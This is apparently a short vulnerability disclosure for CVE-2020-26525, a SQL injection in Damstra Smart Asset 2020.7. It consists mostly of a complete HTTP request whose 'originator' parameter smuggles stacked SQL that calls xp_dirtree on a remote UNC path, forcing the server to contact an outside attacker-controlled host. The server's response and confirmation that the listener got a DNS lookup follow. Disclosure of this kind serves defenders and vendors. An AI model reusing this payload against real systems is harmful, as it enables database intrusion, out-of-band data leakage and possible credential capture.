# SmartAsset-SQLinj-CVE-2020-26525
Damstra Smart Asset 2020.7 has SQL injection via the API/api/Asset originator parameter.

Smart Asset - version  2020.7

CVE-2020-26525


==========================

HTTP Request:

GET /API/api/Asset?assetCode=XXX-08-X-01-06-01&
originator=FIRSTNAME.LASTNAME'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c<<REMOTE URL TO CONNECT TO>>%5cqoe'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 HTTP/1.1
Authorization: Bearer eyJhbGc ...
Cookie: _ga=GA1.3.1950130407.1600387365; _gid=GA1.3.1208628208.1600387365; ajs_group_id=null; intercom-id-zk1ecu97=47f0bf3f-35aa-4f97-9239-456XXa65; intercom-session-zkXX97=

==========================

HTTP Response:

HTTP/1.1 401 Unauthorized
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
<<CUT>>


"Originator provided does not match originator stored within token!"

==========================


The remote listener server received an A DNS lookup for the domain name <<REMOTE URL TO CONNECT TO>> from the target.url.com
  
------------------------------------------

[Discoverer]
Lukasz Studniarz
